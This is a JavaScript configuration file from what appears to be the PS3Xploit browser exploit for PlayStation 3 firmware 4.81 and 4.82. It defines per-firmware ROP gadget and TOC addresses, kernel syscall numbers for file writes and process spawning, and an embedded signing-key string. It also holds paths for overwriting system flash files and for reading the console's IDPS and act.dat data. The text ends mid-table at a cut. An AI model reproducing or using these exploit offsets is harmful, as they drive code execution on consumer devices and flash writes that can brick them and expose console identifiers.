var debug=false;

var ua = navigator.userAgent;
var fwVersion = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple"));

// var explore_plugin_usb='/explore_plugin.sprx';
// var explore_plugin_blind='/dev_blind/vsh/module/explore_plugin.sprx';
// var explore_plugin_fsize=0x18CD85;

// var explore_pluginrco_usb='/explore_plugin_full.rco';
// var explore_pluginrco_blind='/dev_blind/vsh/resource/explore_plugin_full.rco';
// var explore_pluginrco_fsize=0x227ED0;

// var explore_pluginrco2_usb='/explore_category_game.rco';
// var explore_pluginrco2_blind='/dev_blind/vsh/resource/explore_category_game.rco';
// var explore_pluginrco2_fsize=0x3A6F4;

// var category_game_usb='/category_game.xml';
// var category_game_blind='/dev_blind/vsh/resource/explore/xmb/category_game.xml';
// var category_game_fsize=0x8F77;

// var videoplayer_plugin_usb='/videoplayer_plugin.sprx';
// var videoplayer_plugin_blind='/dev_blind/vsh/module/videoplayer_plugin.sprx';
// var videoplayer_plugin_fsize=0x1C166A;

// var explore_category_psn_usb='/explore_category_psn.rco';
// var explore_category_psn_blind='/dev_blind/vsh/resource/explore_category_psn.rco';
// var explore_category_psn_fsize=0x2D6B0;

// var explore_pluginrco3_usb='/explore_plugin_full.rco';
// var explore_pluginrco3_blind='/dev_blind/vsh/resource/explore_plugin_full.rco';
// var explore_pluginrco3_fsize=0x22128C;

// var yourchannels_usb='/yourchannels.png';
// var yourchannels_blind='/dev_blind/vsh/resource/explore/icon/yourchannels.png';
// var yourchannels_fsize=0xB28C;

var lines_qrc_usb='/lines.qrc';
var lines_qrc_blind='/dev_blind/vsh/resource/qgl/lines.qrc';
var lines_qrc_fsize=0x202B0;

var imagefont_usb='/imagefont.bin';
var imagefont_blind='/dev_blind/vsh/resource/imagefont.bin';
var imagefont_fsize=0x67857;

var dummy1_usb='/dummy1.bin';
var dummy1_blind='/tmp/dummy1.bin';

var dummy2_usb='/dummy1.bin';
var dummy2_blind='/tmp/dummy2.bin';

var dummy3_usb='/dummy3.bin';
var dummy3_blind='/tmp/dummy3.bin';

var dummy4_usb='/dummy4.bin';
var dummy4_blind='/tmp/dummy4.bin';

var dummy5_usb='/dummy5.bin';
var dummy5_blind='/tmp/dummy5.bin';

// 1 File Template
var template_1_file_usb='/template_1.bin';
var template_1_file_blind='/dev_hdd0/tmp/template_1.bin';
var template_1_file_buf_addr=0x8B000000;
var template_1_file_usb_addr=0;
var template_1_file_usbfd_addr=0;
var template_1_file_usb_readlen_addr=0;
var template_1_file_blind_addr=0;
var template_1_file_blindfd_addr=0;
var template_1_file_blind_writelen_addr=0;
var template_1_usb_addr=0;
var template_1_blind_addr=0;
var template_1_usb_readlen_addr=0;
var template_1_blind_addr=0;
var template_1_blindfd_addr=0;
var template_1_blind_writelen_addr=0;

// 2 File Template
var template_2_file_usb='/template_2.bin';
var template_2_file_blind='/dev_hdd0/tmp/template_2.bin';
var template_2_file_buf_addr=0x8B000000;
var template_2_file_usb_addr=0;
var template_2_file_usbfd_addr=0;
var template_2_file_usb_readlen_addr=0;
var template_2_file_blind_addr=0;
var template_2_file_blindfd_addr=0;
var template_2_file_blind_writelen_addr=0;
var template_2_usb_addr=0;
var template_2_blind_addr=0;
var template_2_usb_readlen_addr=0;
var template_2_blind_addr=0;
var template_2_blindfd_addr=0;
var template_2_blind_writelen_addr=0;

// 3 File Template
var template_3_file_usb='/template_3.bin';
var template_3_file_blind='/dev_hdd0/tmp/template_3.bin';
var template_3_file_buf_addr=0x8B000000;
var template_3_file_usb_addr=0;
var template_3_file_usbfd_addr=0;
var template_3_file_usb_readlen_addr=0;
var template_3_file_blind_addr=0;
var template_3_file_blindfd_addr=0;
var template_3_file_blind_writelen_addr=0;
var template_3_usb_addr=0;
var template_3_blind_addr=0;
var template_3_usb_readlen_addr=0;
var template_3_blind_addr=0;
var template_3_blindfd_addr=0;
var template_3_blind_writelen_addr=0;

// 4 File Template
var template_4_file_usb='/template_4.bin';
var template_4_file_blind='/dev_hdd0/tmp/template_4.bin';
var template_4_file_buf_addr=0x8B000000;
var template_4_file_usb_addr=0;
var template_4_file_usbfd_addr=0;
var template_4_file_usb_readlen_addr=0;
var template_4_file_blind_addr=0;
var template_4_file_blindfd_addr=0;
var template_4_file_blind_writelen_addr=0;
var template_4_usb_addr=0;
var template_4_blind_addr=0;
var template_4_usb_readlen_addr=0;
var template_4_blind_addr=0;
var template_4_blindfd_addr=0;
var template_4_blind_writelen_addr=0;

// 5 File Template
var template_5_file_usb='/template_5.bin';
var template_5_file_blind='/dev_hdd0/tmp/template_5.bin';
var template_5_file_buf_addr=0x8B000000;
var template_5_file_usb_addr=0;
var template_5_file_usbfd_addr=0;
var template_5_file_usb_readlen_addr=0;
var template_5_file_blind_addr=0;
var template_5_file_blindfd_addr=0;
var template_5_file_blind_writelen_addr=0;
var template_5_usb_addr=0;
var template_5_blind_addr=0;
var template_5_usb_readlen_addr=0;
var template_5_blind_addr=0;
var template_5_blindfd_addr=0;
var template_5_blind_writelen_addr=0;

// 6 File Template
var template_6_file_usb='/template_6.bin';
var template_6_file_blind='/dev_hdd0/tmp/template_6.bin';
var template_6_file_buf_addr=0x8B000000;
var template_6_file_usb_addr=0;
var template_6_file_usbfd_addr=0;
var template_6_file_usb_readlen_addr=0;
var template_6_file_blind_addr=0;
var template_6_file_blindfd_addr=0;
var template_6_file_blind_writelen_addr=0;

// 7 File Template
var template_7_file_usb='/template_7.bin';
var template_7_file_blind='/dev_hdd0/tmp/template_7.bin';
var template_7_file_buf_addr=0x8B000000;
var template_7_file_usb_addr=0;
var template_7_file_usbfd_addr=0;
var template_7_file_usb_readlen_addr=0;
var template_7_file_blind_addr=0;
var template_7_file_blindfd_addr=0;
var template_7_file_blind_writelen_addr=0;

// 8 File Template
var template_8_file_usb='/template_8.bin';
var template_8_file_blind='/dev_hdd0/tmp/template_8.bin';
var template_8_file_buf_addr=0x8B000000;
var template_8_file_usb_addr=0;
var template_8_file_usbfd_addr=0;
var template_8_file_usb_readlen_addr=0;
var template_8_file_blind_addr=0;
var template_8_file_blindfd_addr=0;
var template_8_file_blind_writelen_addr=0;

// 9 File Template
var template_9_file_usb='/template_9.bin';
var template_9_file_blind='/dev_hdd0/tmp/template_9.bin';
var template_9_file_buf_addr=0x8B000000;
var template_9_file_usb_addr=0;
var template_9_file_usbfd_addr=0;
var template_9_file_usb_readlen_addr=0;
var template_9_file_blind_addr=0;
var template_9_file_blindfd_addr=0;
var template_9_file_blind_writelen_addr=0;

// 10 File Template
var template_10_file_usb='/template_10.bin';
var template_10_file_blind='/dev_hdd0/tmp/template_10.bin';
var template_10_file_buf_addr=0x8B000000;
var template_10_file_usb_addr=0;
var template_10_file_usbfd_addr=0;
var template_10_file_usb_readlen_addr=0;
var template_10_file_blind_addr=0;
var template_10_file_blindfd_addr=0;
var template_10_file_blind_writelen_addr=0;

// Used for offsetting
var numberOfFiles=0;
var reboot_sf_ext=0;
var xtra_data_fill_ext=0;

var ps3xploit_ecdsa_key='948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773';
var index_key='DA7D4B5E499A4F53B1C1A14A7484443B';
var f_turnoff='/dev_hdd0/tmp/turnoff';
var idps='idps.hex';
var act='act.dat';
var start_x='xxxx';
var mount_path='/dev_blind';
var mount_path_blind='/dev_blind';
var mount_path_flash='/dev_flash';
var mount_path_flash2='/dev_flash2';
var mount_path_flash3='/dev_flash3';
var mount_path_flash4='/dev_flash4';
var mount_path_hostroot='/host_root';
var mount_path_apphome='/app_home';
var mount_path_bdvd='/dev_bdvd';
var mount_path_hdd0='/dev_hdd0';
var mount_path_hdd1='/dev_hdd1';
var mount_path_hdd2='/dev_hdd2';
var mount_path_usb0='/dev_usb000';
var mount_path_usb1='/dev_usb001';
var mount_path_usb2='/dev_usb002';
var mount_path_usb3='/dev_usb003';
var mount_path_usb4='/dev_usb004';
var mount_path_usb5='/dev_usb005';
var mount_path_usb6='/dev_usb006';
var adminfs_partition='xxxxCELL_FS_ADMINFS:';
var dummy_partition='xxxxCELL_FS_DUMMY:';
var flash_partition='xxxxCELL_FS_IOS:BUILTIN_FLSH1';
var flash_partition1='xxxxCELL_FS_IOS:BUILTIN_FLSH1';
var flash_partition2='xxxxCELL_FS_IOS:BUILTIN_FLSH2';
var flash_partition3='xxxxCELL_FS_IOS:BUILTIN_FLSH3';
var flash_partition4='xxxxCELL_FS_IOS:BUILTIN_FLSH4';
var flash_partition_flash='xxxxCELL_FS_IOS:BUILTIN_FLASH';
var hdd0_partition='xxxxCELL_FS_UTILITY:HDD0';
var hdd1_partition='xxxxCELL_FS_UTILITY:HDD1';
var hdd2_partition='xxxxCELL_FS_UTILITY:HDD2';
var usb_partition='xxxxCELL_FS_IOS:USB_MASS_STORAGE';
var usb_partition0='xxxxCELL_FS_IOS:USB_MASS_STORAGE000';
var usb_partition1='xxxxCELL_FS_IOS:USB_MASS_STORAGE001';
var usb_partition2='xxxxCELL_FS_IOS:USB_MASS_STORAGE002';
var usb_partition3='xxxxCELL_FS_IOS:USB_MASS_STORAGE003';
var usb_partition4='xxxxCELL_FS_IOS:USB_MASS_STORAGE004';
var usb_partition5='xxxxCELL_FS_IOS:USB_MASS_STORAGE005';
var usb_partition6='xxxxCELL_FS_IOS:USB_MASS_STORAGE006';
var bdvd_partition='xxxxCELL_FS_IOS:BDVD_DRIVE';
var bdvd_partition_pata='xxxxCELL_FS_IOS:PATA0_BDVD_DRIVE';
var cf_partition='xxxxCELL_FS_IOS:COMPACT_FLASH';
var ms_partition='xxxxCELL_FS_IOS:MEMORY_STICK';
var sd_partition='xxxxCELL_FS_IOS:SD_CARD';
var hostfs_partition='xxxxCELL_FS_HOSTFS';
var playstation3_partition='xxxx-PLAYSTATION3';
var hddcache_partition='xxxx-HDDCACHE';
var iso9660_multi_partition='xxxx-ISO9660_MULTI';
var filesystem='CELL_FS_FAT';
var filesystem_fat='CELL_FS_FAT';
var filesystem_adminfs='CELL_FS_ADMINFS';
var filesystem_dummy='CELL_FS_DUMMYFS';
var filesystem_iso9660='CELL_FS_ISO9660';
var filesystem_simplefs='CELL_FS_SIMPLEFS';
var filesystem_ufs='CELL_FS_UFS';
var filesystem_path='CELL_FS_PATH:';

var dummy_value="dummy";
var actdat='/dev_hdd0/home/%08u/exdata/act.dat';
var userid='/setting/user/lastLoginUserId';
var path_db_rebuild="/dev_hdd0/mms/db.err";
var vsh_whatsnew='http://www.xmbmods.co/whats_new.xml';
var vsh_whatsnew_patch='http://www.xmbmods.co/whats_new.xml';
//var vsh_whatsnew_patch_addr=0;
var vsh_whatsnew_patch_addr_source=0;
//var whatsnew_buf_addr=0x01A4F000;//CEX
var whatsnew_buf_addr=0x01B4F000;//DEX
//var whatsnew_toc_addr=0x01A4F000;//CEX
var whatsnew_toc_addr=0x01A4F000;//DEX
var whatsnew_length=0x6C;
var whatsnew_length_new=0x30;
var yourchannels_icon='/dev_hdd0/game/HANTOOLBX/USRDIR/yourchannels.png';

var vsh_memory_patch='Hello From Team PS3Xploit';
var vsh_memory_patch_addr=0;
var vsh_memory_patch_addr_source=0;
var vsh_memory_buf_addr=0x01B4F000;//DEX
var vsh_memory_toc_addr=0x01B4F000;//DEX
var vsh_memory_length=0x6C;
var vsh_memory_length_new=0x30;

var rif_name_len=0x28;
var idps_len=0x10;
var act_fsize=0x1038;
var rif_fsize=0x98;
var fread="rb";
var fread_addr=0;
var fwrite="wb";
var fwrite_addr=0;
var db_rebuild_bytes=0x000003E9;
var db_rebuild_bytes_addr=0;
var path_db_rebuild_addr=0;
var offset_array=[];
var store_idx_arr1;
var store_idx_arr2;
var br="<br>";
var hr="<hr>";
var t_out=0;

var dummy_value_addr=0

var coldboot_raf_buf_addr=0x8B000000;
var coldboot_multi_buf_addr=0x8B200000;
var coldboot_stereo_buf_addr=0x8B600000;
var dummy1_buf_addr=0x8BA00000;
var dummy2_buf_addr=0x8BC00000;
var dummy3_buf_addr=0x8BC00000;
var dummy4_buf_addr=0x8BC00000;
var dummy5_buf_addr=0x8BC00000;

var explore_plugin_buf_addr=0x8B000000;
var explore_pluginrco_buf_addr=0x8B200000;
var explore_pluginrco2_buf_addr=0x8B600000;
var videoplayer_plugin_buf_addr=0x8BA00000;
var category_game_buf_addr=0x8BC00000;

var explore_category_psn_buf_addr=0x8B200000;
var explore_pluginrco3_buf_addr=0x8B600000;
var yourchannels_buf_addr=0x8B000000;
var yourchannels_icon=0x8B000000;
var lines_qrc_buf_addr=0x8B000000;
var imagefont_buf_addr=0x8B000000;

var size_validate_addr=0;
var ps3xploit_ecdsa_key_addr=0;
var index_key_addr=0;
var mount_path_blind_addr=0;
var mount_path_apphome_addr=0;
var mount_path_bdvd_addr=0;
var mount_path_hdd0_addr=0;
var mount_path_hdd1_addr=0;
var mount_path_hdd2_addr=0;
var mount_path_flash_addr=0;
var mount_path_flash2_addr=0;
var mount_path_flash3_addr=0;
var mount_path_flash4_addr=0;
var hdd0_partition_addr=0;
var hdd1_partition_addr=0;
var hdd2_partition_addr=0;
var mount_path_hostroot_addr=0;
var mount_path_usb0_addr=0;
var mount_path_usb1_addr=0;
var mount_path_usb2_addr=0;
var mount_path_usb3_addr=0;
var mount_path_usb4_addr=0;
var mount_path_usb5_addr=0;
var mount_path_usb6_addr=0;
var bdvd_partition_addr=0;
var bdvd_partition_pata_addr=0;
var cf_partition_addr=0;
var ms_partition_addr=0;
var sd_partition_addr=0;
var hostfs_partition_addr=0;
var playstation3_partition_addr=0;
var hddcache_partition_addr=0;
var iso9660_multi_partition_addr=0;
var filesystem_fat_addr=0;
var filesystem_iso9660_addr=0;
var filesystem_simplefs_addr=0;
var filesystem_ufs_addr=0;
var filesystem_adminfs_addr=0;
var filesystem_dummy_addr=0;
var filesystem_path_addr=0;
		
var coldboot_raf_usb_addr=0;
var coldboot_raf_usbfd_addr=0;
var coldboot_raf_usb_readlen_addr=0;
var coldboot_raf_blind_addr=0;
var coldboot_raf_blindfd_addr=0;
var coldboot_raf_blind_writelen_addr=0;
var coldboot_raf_buf_addr=0;

var coldboot_multi_usb_addr=0;
var coldboot_multi_usbfd_addr=0;
var coldboot_multi_usb_readlen_addr=0;
var coldboot_multi_blind_addr=0;
var coldboot_multi_blindfd_addr=0;
var coldboot_multi_blind_writelen_addr=0;

var coldboot_stereo_usb_addr=0;
var coldboot_stereo_usbfd_addr=0;
var coldboot_stereo_usb_readlen_addr=0;
var coldboot_stereo_blind_addr=0;
var coldboot_stereo_blindfd_addr=0;
var coldboot_stereo_blind_writelen_addr=0;

var explore_category_psn_usb_addr=0;
var explore_category_psn_blind_addr=0;
var explore_category_psn_fsize_addr=0;
var explore_category_psn_usb_readlen_addr=0;
var explore_category_psn_blind_addr=0;
var explore_category_psn_blindfd_addr=0;
var explore_category_psn_blind_writelen_addr=0;

var explore_pluginrco3_usb_addr=0;
var explore_pluginrco3_blind_addr=0;
var explore_pluginrco3_fsize_addr=0;
var explore_pluginrco3_usb_readlen_addr=0;
var explore_pluginrco3_blind_addr=0;
var explore_pluginrco3_blindfd_addr=0;
var explore_pluginrco3_blind_writelen_addr=0;

var yourchannels_usb_addr=0;
var yourchannels_blind_addr=0;
var yourchannels_usb_readlen_addr=0;
var yourchannels_blind_addr=0;
var yourchannels_blindfd_addr=0;
var yourchannels_blind_writelen_addr=0;

var lines_qrc_usb_addr=0;
var lines_qrc_blind_addr=0;
var lines_qrc_usb_readlen_addr=0;
var lines_qrc_blind_addr=0;
var lines_qrc_blindfd_addr=0;
var lines_qrc_blind_writelen_addr=0;

var imagefont_usb_addr=0;
var imagefont_blind_addr=0;
var imagefont_usb_readlen_addr=0;
var imagefont_blind_addr=0;
var imagefont_blindfd_addr=0;
var imagefont_blind_writelen_addr=0;

var dummy1_usb_addr=0;
var dummy1_usbfd_addr=0;
var dummy1_usb_readlen_addr=0;
var dummy1_blind_addr=0;
var dummy1_blindfd_addr=0;
var dummy1_blind_writelen_addr=0;

var dummy2_usb_addr=0;
var dummy2_usbfd_addr=0;
var dummy2_usb_readlen_addr=0;
var dummy2_blind_addr=0;
var dummy2_blindfd_addr=0;
var dummy2_blind_writelen_addr=0;

var dummy3_usb_addr=0;
var dummy3_usbfd_addr=0;
var dummy3_usb_readlen_addr=0;
var dummy3_blind_addr=0;
var dummy3_blindfd_addr=0;
var dummy3_blind_writelen_addr=0;

var dummy4_usb_addr=0;
var dummy4_usbfd_addr=0;
var dummy4_usb_readlen_addr=0;
var dummy4_blind_addr=0;
var dummy4_blindfd_addr=0;
var dummy4_blind_writelen_addr=0;

var dummy5_usb_addr=0;
var dummy5_usbfd_addr=0;
var dummy5_usb_readlen_addr=0;
var dummy5_blind_addr=0;
var dummy5_blindfd_addr=0;
var dummy5_blind_writelen_addr=0;

var explore_pluginrco2_usb_addr=0;
var explore_pluginrco2_blind_addr=0;
var explore_pluginrco2_usbfd_addr=0;
var explore_pluginrco2_usb_readlen_addr=0;
var explore_pluginrco2_blindfd_addr=0;
var explore_pluginrco2_blind_writelen_addr=0;

var explore_pluginrco_usb_addr=0;
var explore_pluginrco_blind_addr=0;
var explore_pluginrco_usbfd_addr=0;
var explore_pluginrco_usb_readlen_addr=0;
var explore_pluginrco_blindfd_addr=0;
var explore_pluginrco_blind_writelen_addr=0;

var explore_plugin_usb_addr=0;
var explore_plugin_blind_addr=0;
var explore_plugin_usbfd_addr=0;
var explore_plugin_usb_readlen_addr=0;
var explore_plugin_blindfd_addr=0;
var explore_plugin_blind_writelen_addr=0;

var category_game_usb_addr=0;
var category_game_blind_addr=0;

var videoplayer_plugin_usb_addr=0;
var videoplayer_plugin_blind_addr=0;
var videoplayer_plugin_usbfd_addr=0;
var videoplayer_plugin_usb_readlen_addr=0;
var videoplayer_plugin_blindfd_addr=0;
var videoplayer_plugin_blind_writelen_addr=0;

var category_game_usbfd_addr=0;
var category_game_usb_readlen_addr=0;
var category_game_blindfd_addr=0;
var category_game_blind_writelen_addr=0;

var reboot_sf_addr=0;
var mount_path_addr=0;
var fs_addr=0;
var flash_partition_addr=0;
var null_addr=0;
var stat_addr=0;

var search_max_threshold=70*0x100000; // 70Mb maximum memory search
var search_base=0x80100000;//0x80190000;//
var search_size=2*mbytes;
var search_base_off=0x0;//0x90000;//0x100000;
var search_size_ext=0x0;
var gtemp_addr=0x8D000000;
var total_loops=0;
var max_loops=20;
var frame_fails=0;
var sp_exit=0x8FD8DCC0;
var da_func=0x5007;
var da_addr_val=0x3F;
var da_addr_val2=0x46;
var ffs=0xFFFFFFFF;
var dbyte41=0x4141;
var dbyte00=0x0000;
var byte_size=0x1;
var hword_size=0x2;
var word_size=0x4;
var dword_size=0x8;
var mbytes=0x100000;
var store_idx_arr1;
var store_idx_arr2;
var f_off_start=0x0;
var f_off=0x0;
var ppu_kalloc_id=0x111;
var ppu_kalloc_sz=0x64;

var soft_reboot=0x200;
var hard_reboot=0x1200;
var power_down=0x1100;
var sc_sm_shutdown=0x17B;

var sc_buzzer=0x188;
var buzzer_arg1=0x1004;
var buzzer_arg2=0xA;
var buzzer_arg3=0x1B6;

var sc_update_manager_if=0x0000035F;
var minver=0;
var minver_addr=gtemp_addr-0x10000;

var sc_sso=0x258;
var sc_ssr=0x25A;
var sc_ssc=0x259;
var sc_proc_spawn=0x1B;
var sc_container_create=0x144; 
var sc_container_destroy=0x145;
var sc_ppu_kernel_alloc=0x37;
var sc_disc_authoring=0x360;
var sc_fs_open=0x321;
var sc_fs_read=0x322;
var sc_fs_write=0x323;
var sc_fs_unlink=0x32E;
var sc_fs_close=0x324;
var sc_fs_stat=0x328;
var sc_fs_umount=0x345;
var sc_fs_unmount=0x346;

var fs_flag_readonly=0x0;
var fs_flag_create=0x241;
var fs_flag_create_append=0x441;
var fs_mode=0x1B6;
var stat_size_offset=0x28;

var toc_addr=0;
var vsh_whatsnew_addr=0;
var vsh_memory_addr=0;
var vsh_opd_addr=0;
var vsh_opd_patch=0;
var vsh_toc_addr_screenshot=0;
var vsh_ps3xploit_key_toc=0;
var default_vsh_pub_toc=0;
var toc_entry1_addr=0;
var toc_entry2_addr=0;
var toc_entry3_addr=0;
var toc_entry4_addr=0;
var toc_entry5_addr=0;
var toc_entry6_addr=0;
var gadget1_addr=0;
var gadget2_addr=0;
var gadget3_addr=0;
var gadget4_addr=0;
var gadget5_addr=0;
var gadget6_addr=0;
var gadget7_addr=0;
var gadget8_addr=0;
var gadget9_addr=0;
var gadget10_addr=0;
var gadget11_addr=0;
var gadget12_addr=0;
var gadget13_addr=0;
var gadget14_addr=0;
var gadget15_addr=0;
var gadget_mod1_addr=0;
var gadget_mod2_addr=0;
var gadget_mod3_addr=0;
var gadget_mod4a_addr=0;
var gadget_mod4b_addr=0;
var gadget_mod4c_addr=0;
var gadget_mod5_addr=0;
var gadget_mod6_addr=0;
var gadget_mod7_addr=0;
var gadget_mod8_addr=0;
var gadget_mod9_addr=0;
var gadget_mod10_addr=0;
var gadget_mod11_addr=0;
var gadget_mod12_addr=0;
var gadget_mod13_addr=0;
var gadget_mod14_addr=0;
var gadget_mod15_addr=0;
var gadget_mod16_addr=0;
var ipf1_addr=0; 
var ipf2_addr=0; 
var xtra_data;var stack_frame;var jump_2;var jump_1;var xtra_data_addr;var stack_frame_addr;var jump_2_addr;var jump_1_addr;
var fail_msg_frag=hr+"<h1><b>Exploit Initialization FAILED!</h1><h2><span style='color:#000000;'><a href=\"javascript:window.location.reload();\">Refresh this page</a> & try again...</span></b></h2>";
var progress_msg_frag1=hr+"<h1><b>Exploit Initialization..."+br+"<span style='color:#000000;'>Progress: ";
var progress_msg_frag2='%, please wait...</span></b></h1>';


//DEX 4.81
var toc_addr_481_d = 0x705610;
var vsh_opd_addr_481_d=0x6FBC28;
var vsh_opd_patch_481_d=0x096E14;
var vsh_toc_addr_screenshot_481_d=0x730ADC;
var vsh_ps3xploit_key_toc_481_d=0x717CA4;
var default_vsh_pub_toc_481_d=0x6FD664;
var toc_entry1_addr_481_d=0x6EA4B8;
var toc_entry2_addr_481_d=0x735F98;//idps
var toc_entry3_addr_481_d=0x6EA4B0;
var toc_entry4_addr_481_d=0x750000;
var toc_entry5_addr_481_d=0x6FB780;
var toc_entry6_addr_481_d=0x0;
var gadget1_addr_481_d=0x0976BC;
var gadget2_addr_481_d=0x6112C4;
var gadget3_addr_481_d=0x0DA5A8;
var gadget4_addr_481_d=0x231120;
var gadget5_addr_481_d=0x1329D8;
var gadget6_addr_481_d=0x61CEBC;// old 0x639648 //malloc
var gadget7_addr_481_d=0x020084;//memset
var gadget8_addr_481_d=0x0200B4;//memcpy
var gadget9_addr_481_d=0x029BBC;
var gadget10_addr_481_d=0x635204;////addi 0xC0
var gadget11_addr_481_d=0x5A1CA0;
var gadget12_addr_481_d=0x0CD640; //reboot prep sub
var gadget13_addr_481_d=0x496198;// old 0x48E5A4 //free
var gadget14_addr_481_d=0x494390;
var gadget15_addr_481_d=0x491878;
var gadget_mod1_addr_481_d=0x6161B8;
var gadget_mod2_addr_481_d=0x013B74;
var gadget_mod3_addr_481_d=0x0B8EB8;
var gadget_mod4a_addr_481_d=0x0DEBD8;
var gadget_mod4b_addr_481_d=0x434368;
var gadget_mod4c_addr_481_d=0x054BA8;
var gadget_mod5_addr_481_d=0x42B4CC;
var gadget_mod6_addr_481_d=0x020CB4;
var gadget_mod7_addr_481_d=0x01A6AC;
var gadget_mod8_addr_481_d=0x2C24DC;
var gadget_mod9_addr_481_d=0x010B20;
var gadget_mod10_addr_481_d=0x1CD0B8;
var gadget_mod11_addr_481_d=0x192190;
var gadget_mod12_addr_481_d=0x63A3DC;
var gadget_mod13_addr_481_d=0x33E480;
var gadget_mod14_addr_481_d=0x63AAE0;
var gadget_mod15_addr_481_d=0x3A4C28;
var gadget_mod16_addr_481_d=0x4FEF1C;
var ipf1_addr_481_d=0x6FBC60; //fix offset
var ipf2_addr_481_d=0x50EF68; //fix offset

//DEX 4.82
var toc_addr_482_d = 0x705640;
var prx_explore_plugin_toc_addr_482_d=0x0;// size 0x30
var vsh_whatsnew_patch_addr_482_d=0x0;// explore_plugin
var vsh_whatsnew_xml_addr_482_d=0x0;
var vsh_opd_addr_482_d=0x6FBC58;
var vsh_opd_patch_482_d=0x096E14;
var vsh_toc_addr_screenshot_482_d=0x730F1C;
var vsh_ps3xploit_key_toc_482_d=0x7180DC;
var default_vsh_pub_toc_482_d=0x6FD694;
var toc_entry1_addr_482_d=0x6EA4B8;
var toc_entry2_addr_482_d=0x735F8C;// idps
var toc_entry3_addr_482_d=0x6EA4B0;
var toc_entry4_addr_482_d=0x750000;
var toc_entry5_addr_482_d=0x6FB7B0;
var toc_entry6_addr_482_d=0x0;
var gadget1_addr_482_d=0x0976BC;
var gadget2_addr_482_d=0x611C60;
var gadget3_addr_482_d=0x0DA5A8;
var gadget4_addr_482_d=0x231120;
var gadget5_addr_482_d=0x1329D8;
var gadget6_addr_482_d=0x61D858;// malloc
var gadget7_addr_482_d=0x020084;// memset
var gadget8_addr_482_d=0x0200B4;// memcpy
var gadget9_addr_482_d=0x029BBC;
var gadget10_addr_482_d=0x635BA0;//addi 0xC0
var gadget11_addr_482_d=0x5A20A4;// sprintf
var gadget12_addr_482_d=0x0CD640;// reboot prep sub
var gadget13_addr_482_d=0x49619C;// free
var gadget14_addr_482_d=0x494394;
var gadget15_addr_482_d=0x49187C;
var gadget_mod1_addr_482_d=0x616B54;
var gadget_mod2_addr_482_d=0x013B74;
var gadget_mod3_addr_482_d=0x0B8EB8;
var gadget_mod4a_addr_482_d=0x0DEBD8;
var gadget_mod4b_addr_482_d=0x43436C;
var gadget_mod4c_addr_482_d=0x054BA8;
var gadget_mod5_addr_482_d=0x42B4D0;
var gadget_mod6_addr_482_d=0x020CB4;
var gadget_mod7_addr_482_d=0x01A6AC;
var gadget_mod8_addr_482_d=0x2C24E0;
var gadget_mod9_addr_482_d=0x010B20;
var gadget_mod10_addr_482_d=0x1CD0B8;
var gadget_mod11_addr_482_d=0x192190;
var gadget_mod12_addr_482_d=0x63AD78;
var gadget_mod13_addr_482_d=0x33E484;
var gadget_mod14_addr_482_d=0x63B47C;
var gadget_mod15_addr_482_d=0x3A4C2C;
var gadget_mod16_addr_482_d=0x4FEF20;
var e_fopen_write_close=0x42B70C;
var ipf1_addr_482_d=0x6FBC60; 
var ipf2_addr_482_d=0x50EF68; 

//CEX 4.81
var toc_addr_481 = 0x6F5520;
var default_vsh_pub_toc_481=0x6ED574;
var vsh_opd_patch_481=0x096D5C;
var vsh_opd_addr_481=0x6EBB38;
var vsh_ps3xploit_key_toc_481=0x70733C;
var vsh_toc_addr_screenshot_481=0x72057C;
var toc_entry1_addr_481=0x6DA3D0;
var toc_entry2_addr_481=0x725608;
var toc_entry3_addr_481=0x6DA3C8;
var toc_entry4_addr_481=0x740000;
var toc_entry5_addr_481=0x6EB690;
var toc_entry6_addr_481=0x0;
var gadget1_addr_481=0x097604;
var gadget2_addr_481=0x6096A8;
var gadget3_addr_481=0x0D505C;
var gadget4_addr_481=0x229838;
var gadget5_addr_481=0x12BB1C;
var gadget6_addr_481=0x6152A0;//malloc
var gadget7_addr_481=0x01FFD0;//memset
var gadget8_addr_481=0x020000;//memcpy
var gadget9_addr_481=0x029B08;
var gadget10_addr_481=0x62D5E8;
var gadget11_addr_481=0x59A0AC;
var gadget12_addr_481=0x0C864C;
var gadget13_addr_481=0x48E5A0;//free
var gadget14_addr_481=0x48C79C;
var gadget15_addr_481=0x489C84;
var gadget_mod1_addr_481=0x60E59C;//
var gadget_mod2_addr_481=0x013B74;
var gadget_mod3_addr_481=0x0B8E00;
var gadget_mod4a_addr_481=0x0D9684;//
var gadget_mod4b_addr_481=0x42C774;//
var gadget_mod4c_addr_481=0x054AF0;
var gadget_mod5_addr_481=0x4238D8;
var gadget_mod6_addr_481=0x4E23F0;
var gadget_mod7_addr_481=0x01A6AC;
var gadget_mod8_addr_481=0x2BACB4;
var gadget_mod9_addr_481=0x010B20;
var gadget_mod10_addr_481=0x1C5794;
var gadget_mod11_addr_481=0x18B144;
var gadget_mod12_addr_481=0x6327C0;
var gadget_mod13_addr_481=0x33686C;
var gadget_mod14_addr_481=0x632EC4;
var gadget_mod15_addr_481=0x39D034;
var gadget_mod16_addr_481=0x4F7328;
var ipf1_addr_481=0x6ebb70; //fix offset
var ipf2_addr_481=0x507374; //fix offset

//CEX 4.82
var toc_addr_482 = 0x6F5550;
var default_vsh_pub_toc_482=0x6ED5A4;
var vsh_opd_patch_482=0x96D5C;
var vsh_opd_addr_482=0x6EBB68;
var vsh_toc_addr_screenshot_482=0x72057C;
var vsh_ps3xploit_key_toc_482=0x707774;
var toc_entry1_addr_482=0x6DA3D0;
var toc_entry2_addr_482=0x725A38;//idps
var toc_entry3_addr_482=0x6DA3C8;
var toc_entry4_addr_482=0x740000;
var toc_entry5_addr_482=0x6EB6C0;
var toc_entry6_addr_482=0x0;
var gadget1_addr_482=0x097604;
var gadget2_addr_482=0x60A044;
var gadget3_addr_482=0x0D505C;
var gadget4_addr_482=0x229838;
var gadget5_addr_482=0x12BB1C;
var gadget6_addr_482=0x615C3C;//malloc
var gadget7_addr_482=0x01FFD0;//memset
var gadget8_addr_482=0x020000;//memcpy
var gadget9_addr_482=0x029B08;
var gadget10_addr_482=0x62DF84;
var gadget11_addr_482=0x59A4B0;
var gadget12_addr_482=0x0C864C;
var gadget13_addr_482=0x48E5A8;//free
var gadget14_addr_482=0x48C7A0;
var gadget15_addr_482=0x489C88;
var gadget_mod1_addr_482=0x60EF38;
var gadget_mod2_addr_482=0x013B74;
var gadget_mod3_addr_482=0x0B8E00;
var gadget_mod4a_addr_482=0x0D9684;
var gadget_mod4b_addr_482=0x42C778;
